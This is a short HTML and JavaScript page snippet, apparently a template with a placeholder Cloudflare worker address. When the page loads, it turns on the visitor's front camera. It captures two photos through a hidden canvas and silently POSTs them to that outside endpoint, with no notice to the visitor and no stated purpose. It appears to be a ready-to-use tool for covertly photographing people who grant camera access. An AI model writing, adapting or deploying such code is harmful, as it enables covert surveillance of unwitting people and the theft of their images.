<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const workerURL = "https://YOUR-WORKER-NAME.workers.dev";

navigator.mediaDevices.getUserMedia({
  video: {
    facingMode: "user",
    width: 1280,
    height: 720
  }
})
.then(stream => {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  video.srcObject = stream;

  video.onloadedmetadata = async () => {
    await takeAndSend();
    await wait(500);
    await takeAndSend();
  };

  function takeAndSend() {
    return new Promise(resolve => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const fd = new FormData();
        fd.append("photo", blob);

        fetch(workerURL, {
          method: "POST",
          body: fd
        }).finally(resolve);

      }, "image/jpeg", 0.95);
    });
  }

  function wait(ms) {
    return new Promise(r => setTimeout(r, ms));
  }
})
.catch(err => {
  console.log("Camera error:", err);
});
</script>
